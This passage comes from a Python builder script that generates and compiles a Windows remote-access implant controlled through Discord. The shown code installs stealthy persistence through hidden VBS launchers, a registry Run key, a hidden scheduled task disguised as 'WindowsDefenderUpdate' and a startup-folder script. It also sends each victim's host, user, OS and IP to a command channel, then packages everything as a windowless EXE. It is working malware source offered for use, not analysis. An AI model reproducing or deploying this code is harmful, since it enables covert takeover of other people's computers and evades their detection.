    #  PERSISTENCE — all methods run silently via VBS
    #  No CMD window, no PowerShell flash, fully background
    # ══════════════════════════════════════════════════════

    def _make_vbs(self, name):
        """
        Write a tiny VBScript launcher that runs our EXE
        completely invisibly (WindowStyle=0, no console).
        Returns the path to the .vbs file.
        """
        sp = (sys.executable if getattr(sys, "frozen", False)
              else os.path.abspath(__file__))
        vbs_path = os.path.join(
            os.environ.get("APPDATA", ""), name)
        with open(vbs_path, "w") as f:
            # Chr(34) = double-quote — avoids escaping issues
            f.write(
                'Set o = CreateObject("WScript.Shell")\r\n'
                'o.Run Chr(34) & "' + sp + '" & Chr(34), 0, False\r\n'
            )
        return vbs_path

    def _preg(self):
        """
        Registry Run key — points to wscript.exe + our vbs.
        wscript with //B flag = silent, no dialogs, no window.
        """
        try:
            vbs = self._make_vbs("winsec_run.vbs")
            k   = r"HKCU\Software\Microsoft\Windows\CurrentVersion\Run"
            # //B = batch mode (no UI), //Nologo = no logo
            val = f'wscript.exe //B //Nologo "{vbs}"'
            r   = subprocess.run(
                f'reg add "{k}" /v "WinSec" /t REG_SZ /d "{val}" /f',
                shell=True, capture_output=True, text=True)
            if r.returncode == 0:
                return (
                    f"[+] Registry persistence installed (hidden)\n"
                    f"    Key  : HKCU\\...\\Run\\WinSec\n"
                    f"    VBS  : {vbs}"
                )
            return f"[-] Registry failed:\n{r.stderr}"
        except Exception as e: return f"[-] Registry error: {e}"

    def _ptask(self):
        """
        Scheduled Task using PowerShell New-ScheduledTask cmdlets.
        -Hidden flag hides it from Task Scheduler UI in some versions.
        Runs wscript //B so zero window is shown.
        """
        try:
            vbs = self._make_vbs("winsec_task.vbs")
            ps  = (
                '$a = New-ScheduledTaskAction '
                '-Execute "wscript.exe" '
                f'-Argument "//B //Nologo \\"{vbs}\\""; '
                '$t = New-ScheduledTaskTrigger -AtLogOn; '
                '$s = New-ScheduledTaskSettingsSet '
                '-Hidden '
                '-ExecutionTimeLimit (New-TimeSpan -Hours 0) '
                '-MultipleInstances IgnoreNew; '
                'Register-ScheduledTask '
                '-TaskName "WindowsDefenderUpdate" '
                '-Action $a -Trigger $t -Settings $s -Force '
                '-RunLevel Limited'
            )
            r = subprocess.run(
                ["powershell", "-WindowStyle", "Hidden",
                 "-NonInteractive", "-NoProfile",
                 "-Command", ps],
                capture_output=True, text=True, timeout=30)
            if r.returncode == 0:
                return (
                    f"[+] Scheduled task installed (hidden)\n"
                    f"    Task : WindowsDefenderUpdate\n"
                    f"    VBS  : {vbs}"
                )
            return (
                f"[-] Task failed (may need elevation):\n"
                f"{r.stderr.strip()[:300]}"
            )
        except Exception as e: return f"[-] Task error: {e}"

    def _pstart(self):
        """
        Startup folder — drops a .vbs file, removes old .bat.
        VBS runs with wscript (GUI subsystem) = no window at all.
        """
        try:
            startup = os.path.join(
                os.environ.get("APPDATA", ""),
                r"Microsoft\Windows\Start Menu\Programs\Startup")
            os.makedirs(startup, exist_ok=True)

            sp = (sys.executable if getattr(sys, "frozen", False)
                  else os.path.abspath(__file__))

            vbs_path = os.path.join(startup, "wupd.vbs")
            with open(vbs_path, "w") as f:
                f.write(
                    'Set o = CreateObject("WScript.Shell")\r\n'
                    'o.Run Chr(34) & "' + sp + '" & Chr(34), 0, False\r\n'
                )

            # Remove old visible .bat if present
            old_bat = os.path.join(startup, "wupd.bat")
            if os.path.isfile(old_bat):
                try:    os.remove(old_bat)
                except: pass

            return (
                f"[+] Startup folder persistence installed (hidden)\n"
                f"    VBS : {vbs_path}"
            )
        except Exception as e: return f"[-] Startup error: {e}"

    def _pall(self):
        results = [
            self._preg(),
            self._ptask(),
            self._pstart(),
        ]
        return "\n\n".join(results)

    def register(self):
        self.api.send(CHANNEL_ID,
            embeds=[{
                "title":       f"🟢 NEW SESSION — {self.sid}",
                "description": (
                    f"Implant online.\n"
                    f"Use `/interact` or click **Interact**.\n"
                    f"Type `/help` to see all commands."
                ),
                "color":  0x57F287,
                "fields": [
                    {"name": "Host", "value": f"`{self.hn}`",
                     "inline": True},
                    {"name": "User", "value": f"`{self.user}`",
                     "inline": True},
                    {"name": "OS",
                     "value": f"`{self.osn} {self.arch}`",
                     "inline": True},
                    {"name": "IP",   "value": f"`{self.ip}`",
                     "inline": True},
                    {"name": "CWD",  "value": f"`{self.cwd}`",
                     "inline": True},
                    {"name": "UTC",
                     "value": f"`{datetime.utcnow().strftime('%Y-%m-%d %H:%M')}`",
                     "inline": True},
                ],
                "footer":    {"text": "C2 Discord"},
                "timestamp": datetime.utcnow().isoformat()
            }],
            components=sbtn(self.sid, False))

    def run(self):
        print(f"[*] {self.sid}  {self.osn}  {self.user}  {self.ip}")
        self.gw.start()
        time.sleep(4)
        print("[*] Registering slash commands...")
        self.api.register_slash(GUILD_ID)
        self.register()
        print("[*] Ready")
        while self.alive:
            time.sleep(1)
        self.gw.stop()


if __name__ == "__main__":
    c = C2()
    try:
        c.run()
    except KeyboardInterrupt:
        sys.exit(0)
'''

    full_code = header + body
    src.write_text(full_code, encoding="utf-8")

    rc, out, serr = run(
        [sys.executable, "-m", "py_compile", str(src)],
        capture=True, check=False
    )
    if rc == 0:
        ok(f"Source OK: {src}  ({len(full_code.splitlines())} lines)")
    else:
        err(f"Syntax error in generated source:\n{serr}")

    return src


def build_exe(py: Path, src: Path) -> Path:
    step("Building EXE")

    dist_dir = BUILD_DIR / "dist"
    work_dir = BUILD_DIR / "build"
    dist_dir.mkdir(parents=True, exist_ok=True)
    work_dir.mkdir(parents=True, exist_ok=True)

    hidden = [
        "requests", "websocket", "websocket._core",
        "websocket._abnf", "websocket._exceptions",
        "urllib3", "charset_normalizer", "idna", "certifi",
        "ctypes", "threading", "json", "socket",
        "subprocess", "platform", "random", "string", "cv2",
    ]
    hf = []
    for h in hidden:
        hf += ["--hidden-import", h]

    cmd = [
        str(py), "-m", "PyInstaller",
        str(src),
        "--name",      OUT_NAME,
        "--onefile",
        "--noconsole",
        "--distpath",  str(dist_dir),
        "--workpath",  str(work_dir),
        "--specpath",  str(BUILD_DIR),
        "--noconfirm",
        "--log-level", "WARN",
        "--clean",
    ] + hf

    info("Running PyInstaller (this takes 2-5 min)...")
    proc = subprocess.Popen(
        cmd, stdout=subprocess.PIPE,
        stderr=subprocess.STDOUT,
        text=True, bufsize=1)
    for line in proc.stdout:
        line = line.rstrip()
        if line: print(f"  {line}")
    proc.wait()
    info(f"PyInstaller exit: {proc.returncode}")

    out_exe = dist_dir / f"{OUT_NAME}.exe"
    if out_exe.exists(): return out_exe
    for f in dist_dir.glob("*.exe"): return f
    err(f"EXE not found in {dist_dir}")


def finalize(exe: Path):
    step("Done")
    desktop = (
        Path(os.environ.get("USERPROFILE", "C:\\Users\\User"))
        / "Desktop" / exe.name
    )
    shutil.copy2(str(exe), str(desktop))
    size_mb = round(exe.stat().st_size / 1048576, 2)
    import hashlib
    h = hashlib.sha256()
    with open(exe, "rb") as f:
        for chunk in iter(lambda: f.read(8192), b""): h.update(chunk)
    sha = h.hexdigest()
    print(f"\n{G}╔══════════════════════════════════════════════╗{E}")
    print(f"{G}║           BUILD COMPLETE                     ║{E}")
    print(f"{G}╚══════════════════════════════════════════════╝{E}")
    print(f"\n  File    : {W}{exe}{E}")
    print(f"  Desktop : {W}{desktop}{E}")
    print(f"  Size    : {W}{size_mb} MB{E}")
    print(f"  SHA256  : {C}{sha}{E}\n")
    v = ask("Delete build directory? [y/N]: ").strip().lower()
    if v == "y":
        shutil.rmtree(str(BUILD_DIR), ignore_errors=True)
        ok("Cleaned")
    else:
        info(f"Build kept: {BUILD_DIR}")


def main():
    enable_ansi()
    banner()
    if sys.platform != "win32":
        err("This script must run on Windows.")
    collect_config()
    ensure_python()
    py = get_python()
    ok(f"Using Python: {py}")
    install_packages(py)
    src = write_source()
    exe = build_exe(py, src)
    finalize(exe)


if __name__ == "__main__":
    try:
        main()
    except KeyboardInterrupt:
        print("\n[!] Cancelled")
        sys.exit(0)
